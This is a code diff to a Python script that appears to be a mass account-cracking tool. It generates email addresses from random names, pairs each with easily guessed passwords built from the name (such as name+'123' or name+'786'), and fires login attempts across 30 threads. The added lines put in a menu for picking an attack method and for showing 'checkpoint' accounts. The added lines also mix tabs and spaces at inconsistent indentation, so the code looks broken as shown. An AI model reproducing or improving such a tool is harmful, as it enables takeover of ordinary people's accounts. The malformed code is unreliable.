@@ -667,6 +667,21 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
+		linex()
+        	print(' All method working try 1 by 1 ')
+        	linex()
+        	print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+        	linex()
+        	mthd = input(' Choose method: ')
+        	linex()
+        	print(' Do you went show cp account? (y/n): ')
+        	linex()
+        	cx=input(' Choose: ')
+        	if cx in ['y','Y','yes','Yes','1']:
+                	pcp.append('y')
+        	else:
+                	pcp.append('n')
+        	linex()
                 with tred(max_workers=30) as yaari:
                         tl = str(len(fo))
                         os.system('clear');print(logo)
@@ -683,7 +698,12 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                yaari.submit(m1,ids,passlist)
+				if mthd in ['1','01']:
+                                        yaari.submit(m1,ids,passlist)
+                                elif mthd in ['2','02']:
+                                        yaari.submit(m2,ids,passlist)
+                                else:
+                                        yaari.submit(m3,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
